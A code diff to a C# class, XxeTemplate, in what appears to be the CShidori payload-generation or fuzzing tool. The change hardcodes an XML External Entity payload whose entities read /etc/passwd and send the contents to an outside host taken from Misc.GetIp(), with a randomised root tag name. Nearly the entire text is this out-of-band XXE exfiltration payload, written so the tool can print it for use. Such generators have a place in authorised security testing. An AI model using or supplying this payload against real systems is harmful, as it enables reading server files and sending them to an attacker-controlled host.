@@ -10,10 +10,21 @@ namespace CShidori.Generator
 {
     public class XxeTemplate
     {
-        public XxeTemplate(string TemplateType)
+        public XxeTemplate()
         {
-            foreach (string l in BadStrings.Output)
-                Console.WriteLine(l.Replace("§", Misc.GetIp()).Replace("foo", Misc.RandomString(3)));
+
+            string XxeString = @"
+<?xml version=""1.0"" encoding=""UTF-8""?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY %xxe SYSTEM ""file:///etc/passwd"">
+<!ENTITY call SYSTEM ""§/?%xxe;"">
+]
+>
+<foo>&call;</foo>
+            ";
+
+            Console.WriteLine(XxeString.Replace("§", Misc.GetIp()).Replace("foo", Misc.RandomString(3)));
         }
     }
 }
